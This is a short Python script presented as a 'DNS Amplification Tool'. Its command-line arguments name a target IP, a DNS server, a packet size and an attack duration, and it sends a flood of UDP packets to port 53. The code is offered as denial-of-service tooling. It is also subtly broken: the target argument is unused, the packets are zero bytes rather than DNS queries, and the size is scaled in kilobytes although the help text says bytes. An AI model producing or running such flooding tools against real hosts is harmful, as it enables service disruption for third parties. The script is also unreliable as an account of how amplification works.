import socket
import time
import argparse
import sys

def dns_amplification(target, dns_server, packet_size, duration):
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Set the DNS server to use
        server_address = (dns_server, 53)

        # Set the packet size and duration
        packet_size_bytes = int(packet_size) * 1024
        duration_seconds = int(duration)

        # Send packets to the DNS server, which will then respond to the target
        start_time = time.time()
        while time.time() - start_time < duration_seconds:
            packet = b'\x00' * packet_size_bytes
            sock.sendto(packet, server_address)

        # Close the socket
        sock.close()

    except socket.error as e:
        print(f"Error: {e}")
        sys.exit(1)

    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)

    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Amplification Tool")
    parser.add_argument("target", help="Target IP address to send DNS responses to")
    parser.add_argument("dns_server", help="DNS server to use for amplification")
    parser.add_argument("packet_size", help="Packet size in bytes (e.g., 100, 512, 1024)")
    parser.add_argument("duration", help="Duration of the attack in seconds (e.g., 10, 30, 60)")

    args = parser.parse_args()

    dns_amplification(args.target, args.dns_server, args.packet_size, args.duration)